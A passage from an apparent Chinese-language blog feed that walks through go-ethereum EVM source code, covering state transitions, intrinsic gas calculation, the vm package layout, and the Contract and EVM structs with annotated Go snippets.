class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// core/state_transation.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TransitionDB 函数通过 apply message 将会改变state 并且返回 包含gas使用情况的结果。</span></span><br><span class="line"><span class="comment">// 如果执行失败，将会返回一个error, 这个error代表一个共识错误。</span></span><br><span class="line">func (st *StateTransition) TransitionDb() (ret []byte, usedGas uint64, failed bool, err error) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">检查nonce是否符合要求，检查账户是否足够支付gas fee</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">   <span class="keyword">if</span> err = st.preCheck(); err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   msg := st.msg</span><br><span class="line">   sender := vm.AccountRef(msg.From())</span><br><span class="line">   homestead := st.evm.ChainConfig().IsHomestead(st.evm.BlockNumber)</span><br><span class="line">    <span class="comment">/* msg.To() == ni 代表创建合约 */</span></span><br><span class="line">   contractCreation := msg.To() == nil</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Pay intrinsic gas</span></span><br><span class="line">    <span class="comment">/* 计算固有成本gas */</span></span><br><span class="line">   gas, <span class="attr">err</span> := IntrinsicGas(st.data, contractCreation, homestead)</span><br><span class="line">   <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span> nil, <span class="number">0</span>, <span class="literal">false</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err = st.useGas(gas); err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span> nil, <span class="number">0</span>, <span class="literal">false</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> (</span><br><span class="line">      evm = st.evm</span><br><span class="line">      <span class="comment">// vm errors do not effect consensus and are therefor</span></span><br><span class="line">      <span class="comment">// not assigned to err, except for insufficient balance</span></span><br><span class="line">      <span class="comment">// error.</span></span><br><span class="line">      vmerr error</span><br><span class="line">   )</span><br><span class="line">    <span class="comment">/* 判断合约类型</span></span><br><span class="line"><span class="comment">---接下来就是调用虚拟机的操作了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">   <span class="keyword">if</span> contractCreation &#123;</span><br><span class="line">       <span class="comment">/* 进行创建合约操作 */</span></span><br><span class="line"><span class="comment">/* st.data = message.data() = tx.txdata.payload */</span></span><br><span class="line">      ret, _, st.gas, vmerr = evm.Create(sender, st.data, st.gas, st.value)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Increment the nonce for the next transaction</span></span><br><span class="line">      st.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+<span class="number">1</span>)</span><br><span class="line">      ret, st.gas, vmerr = evm.Call(sender, st.to(), st.data, st.gas, st.value)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> vmerr != nil &#123;</span><br><span class="line">      log.Debug(<span class="string">"VM returned with error"</span>, <span class="string">"err"</span>, vmerr)</span><br><span class="line">      <span class="keyword">if</span> vmerr == vm.ErrInsufficientBalance &#123;</span><br><span class="line">         <span class="keyword">return</span> nil, <span class="number">0</span>, <span class="literal">false</span>, vmerr</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">/* 退回多余的gas</span></span><br><span class="line"><span class="comment">在EIP3529之前，最多退还一半的gas</span></span><br><span class="line"><span class="comment">EIP3529之后最多退还1/5的gas</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">   st.refundGas()</span><br><span class="line">   st.state.AddBalance(st.evm.Coinbase, <span class="keyword">new</span>(big.Int).Mul(<span class="keyword">new</span>(big.Int).SetUint64(st.gasUsed()), st.gasPrice))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> ret, st.gasUsed(), vmerr != nil, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>preCheck 函数主要进行执行交易前的检查，目前包含下面两个步骤</p><p>1.1 检查msg 里面的nonce值与db里面存储的账户的nonce值是否一致。</p><p>1.2 buyGas方法主要是判断交易账户是否可以支付足够的gas执行交易，如果可以支付，则设置stateTransaction 的gas值 和 initialGas 值。并且从交易执行账户扣除相应的gas值。</p></li><li><p>先获取固定交易的基础费用，根据当前分叉版本和交易类型来决定基础费用，如果是创建合约则是至少是53000gas,如果是普通交易则至少是21000gas ，如果data部分不为空，则具体来说是按字节收费：零字节收4gas，零字节0收68gas（在EIP2028之后是16gas），所以你会看到很多做合约优化的，目的就是减少数据中不为0的字节数量，从而降低油费消耗。具体代码如下</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IntrinsicGas 计算给定数据的固定gas消耗</span></span><br><span class="line">func IntrinsicGas(data []byte, contractCreation, homestead bool) (uint64, error) &#123;</span><br><span class="line">   <span class="comment">// Set the starting gas for the raw transaction</span></span><br><span class="line">   <span class="keyword">var</span> gas uint64</span><br><span class="line">   <span class="keyword">if</span> contractCreation &amp;&amp; homestead &#123;</span><br><span class="line">      gas = params.TxGasContractCreation</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      gas = params.TxGas</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 通过事务数据量增加所需的气体</span></span><br><span class="line">   <span class="keyword">if</span> len(data) &gt; <span class="number">0</span> &#123;</span><br><span class="line">      <span class="comment">// 零字节和非零字节的定价不同</span></span><br><span class="line">      <span class="keyword">var</span> nz uint64</span><br><span class="line">      <span class="comment">//获取非零字节的个数</span></span><br><span class="line">      <span class="keyword">for</span> _, <span class="attr">byt</span> := range data &#123;</span><br><span class="line">         <span class="keyword">if</span> byt != <span class="number">0</span> &#123;</span><br><span class="line">            nz++</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 防止所需gas超过最大限制</span></span><br><span class="line">      <span class="keyword">if</span> (math.MaxUint64-gas)/params.TxDataNonZeroGas &lt; nz &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>, vm.ErrOutOfGas</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//计算非0字节的gas消耗</span></span><br><span class="line">      gas += nz * params.TxDataNonZeroGas</span><br><span class="line"></span><br><span class="line">      z := uint64(len(data)) - nz</span><br><span class="line">      <span class="keyword">if</span> (math.MaxUint64-gas)/params.TxDataZeroGas &lt; z &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>, vm.ErrOutOfGas</span><br><span class="line">      &#125;</span><br><span class="line">      gas += z * params.TxDataZeroGas</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> gas, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> EVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM源码分析（一）</title>
      <link href="/code-analysis/"/>
      <url>/code-analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM源码分析（一）"><a href="#EVM源码分析（一）" class="headerlink" title="EVM源码分析（一）"></a>EVM源码分析（一）</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><p>源码地址：<a href="https://github.com/ethereum/go-ethereum" target="_blank" rel="noopener">https://github.com/ethereum/go-ethereum</a></p><p>EVM的核心代码在core/vm下，而在进入到EVM之前的处理，我们会在第二章讲到，我们这里只分析EVM的层次结构。</p><p>以下为vm的目录结构：</p><p><img src="code-analysis/vm.jpg" alt=""></p><p>runtime 包下的文件在实际运行的geth客户端中并没有被调用到，只是作为开发人员测试使用。</p><ul><li><code>core/vm/runtime/env.go</code> 设置evm运行环境，并返回新的evm对象</li><li><code>core/vm/runtime/fuzz.go</code> fuzz使得开发者可以随机测试evm代码，详见<code>go-fuzz</code>工具</li><li><code>core/vm/runtime/runtime.go</code> 设置evm运行环境，并执行相应的evm代码</li></ul><p>下面的文件为实际的使用到的evm的代码文件</p><ul><li><code>core/vm/analysis.go</code> 分析指令跳转目标</li><li><code>core/vm/common.go</code> 存放常用工具方法</li><li><code>core/vm/contract.go</code> 合约数据结构</li><li><code>core/vm/contracts.go</code> 存放预编译好的合约</li><li><code>core/vm/errors.go</code> 定义一些常见错误</li><li><code>core/vm/evm.go</code> evm对于解释器提供的一些操作接口</li><li><code>core/vm/gas.go</code> 计算一级指令耗费gas</li><li><code>core/vm/gas_table.go</code> 各种操作的gas消耗计算表</li><li><code>core/vm/gen_structlog.go</code> 生成structlog的 序列化json和反序列化方法</li><li><code>core/vm/instructions.go</code> 所有指令集的实现函数</li><li><code>core/vm/interface.go</code> 定义常用操作接口</li><li><code>core/vm/interpreter.go</code> evm 指令解释器</li><li><code>core/vm/intpool.go</code> 常量池</li><li><code>core/vm/jump_table.go</code> 指令跳转表</li><li><code>core/vm/logger.go</code> 状态日志</li><li><code>core/vm/logger_json.go</code> json形式日志</li><li><code>core/vm/memory.go</code> evm 可操作内存</li><li><code>core/vm/memory_table.go</code> evm内存操作表，衡量一些操作耗费内存大小</li><li><code>core/vm/opcodes.go</code> 定义操作码的名称和编号</li><li><code>core/vm/stacks.go</code> evm栈操作</li><li><code>core/vm/stack_table.go</code> evm栈验证函数</li></ul><h2 id="contract-go"><a href="#contract-go" class="headerlink" title="contract.go"></a>contract.go</h2><p>结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对合约支持对象的引用</span></span><br><span class="line">type ContractRef interface &#123;</span><br><span class="line">    Address() common.Address</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AccountRef implements ContractRef.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//帐户引用在 EVM 初始化期间使用，并且它的主要用途是获取地址。删除此对象被证明是困难的，</span></span><br><span class="line"><span class="comment">//因为缓存的跳转目的地从父合约（即调用者）中获取，它是一个 ContractRef。</span></span><br><span class="line">type AccountRef common.Address</span><br><span class="line"></span><br><span class="line"><span class="comment">// Address 将 AccountRef 转换为地址</span></span><br><span class="line">func (ar AccountRef) Address() common.Address &#123; <span class="keyword">return</span> (common.Address)(ar) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表示状态数据库中的以太坊合约。它包含合约代码，调用参数。合约实现 ContractRef</span></span><br><span class="line">type Contract struct &#123;</span><br><span class="line">    <span class="comment">// CallerAddress是初始化这个合约的人。 如果是delegate，这个值被设置为调用者的调用者。</span></span><br><span class="line">    CallerAddress common.Address</span><br><span class="line">    caller        ContractRef</span><br><span class="line">    self          ContractRef</span><br><span class="line"></span><br><span class="line">    jumpdests destinations <span class="comment">// result of JUMPDEST analysis.  JUMPDEST指令的分析</span></span><br><span class="line"></span><br><span class="line">    Code     []byte  <span class="comment">//代码</span></span><br><span class="line">    CodeHash common.Hash  <span class="comment">//代码的HASH</span></span><br><span class="line">    CodeAddr *common.Address <span class="comment">//代码地址</span></span><br><span class="line">    Input    []byte     <span class="comment">// 入参</span></span><br><span class="line"></span><br><span class="line">    Gas   uint64        <span class="comment">// 合约还有多少Gas</span></span><br><span class="line">    value *big.Int      </span><br><span class="line"></span><br><span class="line">    Args []byte</span><br><span class="line"></span><br><span class="line">    DelegateCall bool  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewContract 表示状态数据库中的以太坊合约。它包含合约代码，调用参数。合约实现 ContractRef</span></span><br><span class="line">func NewContract(caller ContractRef, object ContractRef, value *big.Int, gas uint64) *Contract &#123;</span><br><span class="line">    c := &amp;Contract&#123;<span class="attr">CallerAddress</span>: caller.Address(), <span class="attr">caller</span>: caller, <span class="attr">self</span>: object, <span class="attr">Args</span>: nil&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> parent, <span class="attr">ok</span> := caller.(*Contract); ok &#123;</span><br><span class="line">        <span class="comment">// Reuse JUMPDEST analysis from parent context if available.</span></span><br><span class="line">        <span class="comment">// 如果 caller 是一个合约，说明是合约调用了我们。 jumpdests设置为caller的jumpdests</span></span><br><span class="line">        c.jumpdests = parent.jumpdests</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        c.jumpdests = make(destinations)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    c.Gas = gas</span><br><span class="line">    c.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AsDelegate将合约设置为委托调用并返回当前合同（用于链式调用）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AsDelegate sets the contract to be a delegate call and returns the current</span></span><br><span class="line"><span class="comment">// contract (for chaining calls)</span></span><br><span class="line">func (c *Contract) AsDelegate() *Contract &#123;</span><br><span class="line">    c.DelegateCall = <span class="literal">true</span></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> caller must, at all times be a contract. It should never happen</span></span><br><span class="line">    <span class="comment">// that caller is something other than a Contract.</span></span><br><span class="line">    parent := c.caller.(*Contract)</span><br><span class="line">    c.CallerAddress = parent.CallerAddress</span><br><span class="line">    c.value = parent.value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GetOp 用来获取下一跳指令</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GetOp returns the n'th element in the contract's byte array</span></span><br><span class="line">func (c *Contract) GetOp(n uint64) OpCode &#123;</span><br><span class="line">    <span class="keyword">return</span> OpCode(c.GetByte(n))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetByte returns the n'th byte in the contract's byte array</span></span><br><span class="line">func (c *Contract) GetByte(n uint64) byte &#123;</span><br><span class="line">    <span class="keyword">if</span> n &lt; uint64(len(c.Code)) &#123;</span><br><span class="line">        <span class="keyword">return</span> c.Code[n]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Caller returns the caller of the contract.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Caller will recursively call caller when the contract is a delegate</span></span><br><span class="line"><span class="comment">// call, including that of caller's caller.</span></span><br><span class="line">func (c *Contract) Caller() common.Address &#123;</span><br><span class="line">    <span class="keyword">return</span> c.CallerAddress</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UseGas使用Gas。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UseGas attempts the use gas and subtracts it and returns true on success</span></span><br><span class="line">func (c *Contract) UseGas(gas uint64) (ok bool) &#123;</span><br><span class="line">    <span class="keyword">if</span> c.Gas &lt; gas &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.Gas -= gas</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Address returns the contracts address</span></span><br><span class="line">func (c *Contract) Address() common.Address &#123;</span><br><span class="line">    <span class="keyword">return</span> c.self.Address()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Value returns the contracts value (sent to it from it's caller)</span></span><br><span class="line">func (c *Contract) Value() *big.Int &#123;</span><br><span class="line">    <span class="keyword">return</span> c.value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SetCode ，SetCallCode 设置代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SetCode sets the code to the contract</span></span><br><span class="line">func (self *Contract) SetCode(hash common.Hash, code []byte) &#123;</span><br><span class="line">    self.Code = code</span><br><span class="line">    self.CodeHash = hash</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetCallCode sets the code of the contract and address of the backing data</span></span><br><span class="line"><span class="comment">// object</span></span><br><span class="line">func (self *Contract) SetCallCode(addr *common.Address, hash common.Hash, code []byte) &#123;</span><br><span class="line">    self.Code = code</span><br><span class="line">    self.CodeHash = hash</span><br><span class="line">    self.CodeAddr = addr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EVM.go</p><p>结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上下文为EVM提供辅助信息。 一旦提供，不应该修改。</span></span><br><span class="line">type Context struct &#123;</span><br><span class="line">    <span class="comment">// CanTransfer 函数返回账户是否有足够的ether用来转账</span></span><br><span class="line">    CanTransfer CanTransferFunc</span><br><span class="line">    <span class="comment">// Transfer transfers ether from one account to the other</span></span><br><span class="line">    <span class="comment">// Transfer 用来从一个账户给另一个账户转账</span></span><br><span class="line">    Transfer TransferFunc</span><br><span class="line">    <span class="comment">// GetHash returns the hash corresponding to n</span></span><br><span class="line">    <span class="comment">// GetHash用来返回入参n对应的hash值</span></span><br><span class="line">    GetHash GetHashFunc</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Message information</span></span><br><span class="line">    <span class="comment">// 用来提供Origin的信息 sender的地址</span></span><br><span class="line">    Origin   common.Address <span class="comment">// Provides information for ORIGIN</span></span><br><span class="line">    <span class="comment">// 用来提供GasPrice信息</span></span><br><span class="line">    GasPrice *big.Int       <span class="comment">// Provides information for GASPRICE</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Block information</span></span><br><span class="line">    Coinbase    common.Address <span class="comment">// Provides information for COINBASE</span></span><br><span class="line">    GasLimit    *big.Int       <span class="comment">// Provides information for GASLIMIT</span></span><br><span class="line">    BlockNumber *big.Int       <span class="comment">// Provides information for NUMBER</span></span><br><span class="line">    Time        *big.Int       <span class="comment">// Provides information for TIME</span></span><br><span class="line">    Difficulty  *big.Int       <span class="comment">// Provides information for DIFFICULTY</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EVM is the Ethereum Virtual Machine base object and provides</span></span><br><span class="line"><span class="comment">// the necessary tools to run a contract on the given state with</span></span><br><span class="line"><span class="comment">// the provided context. It should be noted that any error</span></span><br><span class="line"><span class="comment">// generated through any of the calls should be considered a</span></span><br><span class="line"><span class="comment">// revert-state-and-consume-all-gas operation, no checks on</span></span><br><span class="line"><span class="comment">// specific errors should ever be performed. The interpreter makes</span></span><br><span class="line"><span class="comment">// sure that any errors generated are to be considered faulty code.</span></span><br><span class="line"><span class="comment">// EVM是以太坊虚拟机基础对象，并提供必要的工具，以使用提供的上下文运行给定状态的合约。</span></span><br><span class="line"><span class="comment">// 应该指出的是，任何调用产生的任何错误都应该被认为是一种回滚修改状态和消耗所有GAS操作，</span></span><br><span class="line"><span class="comment">// 不应该执行对具体错误的检查。 解释器确保生成的任何错误都被认为是错误的代码。</span></span><br><span class="line"><span class="comment">// The EVM should never be reused and is not thread safe.</span></span><br><span class="line">type EVM struct &#123;</span><br><span class="line">    <span class="comment">// Context provides auxiliary blockchain related information</span></span><br><span class="line">    Context</span><br><span class="line">    <span class="comment">// StateDB gives access to the underlying state</span></span><br><span class="line">    StateDB StateDB</span><br><span class="line">    <span class="comment">// Depth is the current call stack</span></span><br><span class="line">    <span class="comment">// 当前的调用堆栈</span></span><br><span class="line">    depth int</span><br><span class="line"></span><br><span class="line">    <span class="comment">// chainConfig contains information about the current chain</span></span><br><span class="line">    <span class="comment">// 包含了当前的区块链的信息</span></span><br><span class="line">    chainConfig *params.ChainConfig</span><br><span class="line">    <span class="comment">// chain rules contains the chain rules for the current epoch</span></span><br><span class="line">    chainRules params.Rules</span><br><span class="line">    <span class="comment">// virtual machine configuration options used to initialise the</span></span><br><span class="line">    <span class="comment">// evm.</span></span><br><span class="line">    vmConfig Config</span><br><span class="line">    <span class="comment">// global (to this context) ethereum virtual machine</span></span><br><span class="line">    <span class="comment">// used throughout the execution of the tx.</span></span><br><span class="line">    interpreter *Interpreter</span><br><span class="line">    <span class="comment">// abort is used to abort the EVM calling operations</span></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> must be set atomically</span></span><br><span class="line">    abort int32</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewEVM retutrns a new EVM . The returned EVM is not thread safe and should</span></span><br><span class="line"><span class="comment">// only ever be used *once*.</span></span><br><span class="line">func NewEVM(ctx Context, statedb StateDB, chainConfig *params.ChainConfig, vmConfig Config) *EVM &#123;</span><br><span class="line">    evm := &amp;EVM&#123;</span><br><span class="line">        Context:     ctx,</span><br><span class="line">        StateDB:     statedb,</span><br><span class="line">        vmConfig:    vmConfig,</span><br><span class="line">        chainConfig: chainConfig,</span><br><span class="line">        chainRules:  chainConfig.Rules(ctx.BlockNumber),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evm.interpreter = NewInterpreter(evm, vmConfig)</span><br><span class="line">    <span class="keyword">return</span> evm</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cancel cancels any running EVM operation. This may be called concurrently and</span></span><br><span class="line"><span class="comment">// it's safe to be called multiple times.</span></span><br><span class="line">func (evm *EVM) Cancel() &#123;</span><br><span class="line">    atomic.StoreInt32(&amp;evm.abort, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合约创建 Create 会创建一个新的合约。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 